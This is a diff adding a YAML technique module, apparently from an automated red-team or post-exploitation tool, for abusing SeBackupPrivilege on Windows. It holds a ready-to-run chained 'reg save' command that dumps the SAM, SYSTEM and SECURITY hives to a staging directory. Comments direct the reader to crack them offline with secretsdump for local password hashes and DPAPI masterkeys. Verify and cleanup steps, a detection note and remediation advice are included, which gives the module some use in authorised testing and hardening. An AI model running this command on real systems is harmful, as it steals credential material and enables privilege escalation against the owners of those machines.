@@ -1,0 +1,37 @@
+# SeBackupPrivilege → dump the SAM / SYSTEM / SECURITY hives
+#
+# SeBackup lets a token read files regardless of DACL (for backup software).
+# `reg save` is the friendliest primitive: no LSASS touch, no minidump, no
+# code injection — just three registry reads out to disk. Pull the .hive
+# files back and run secretsdump offline for local hashes and cached DPAPI
+# masterkeys.
+technique: T1003.002
+name: SeBackup → dump the SAM/SYSTEM hives
+tactic: [credential-access, privilege-escalation]
+platform: [windows]
+ranking:
+  exploitability: high
+  safety: config-change     # writes .hive files to the stage dir
+  detection: moderate
+detect:
+  privilege: SeBackupPrivilege
+execute:
+  command: |-
+    reg save HKLM\SAM {{stage}}\sam & reg save HKLM\SYSTEM {{stage}}\sys & reg save HKLM\SECURITY {{stage}}\sec
+verify:
+  success: "operation completed successfully"
+cleanup:
+  command: |-
+    del {{stage}}\sam {{stage}}\sys {{stage}}\sec
+report:
+  vector_type: sebackup
+  description: >
+    A token holding SeBackupPrivilege reads any file regardless of DACL.
+    `reg save` dumps SAM (local hashes), SYSTEM (bootkey needed to decrypt
+    them), and SECURITY (cached DPAPI masterkeys). Feed the trio to
+    secretsdump.py offline.
+  remediation: >
+    Restrict SeBackupPrivilege to a purpose-built backup service account
+    that is protected by tier and audited. Non-tier-0 users should never
+    hold it.
+  refs: [T1003.002, T1078.003]
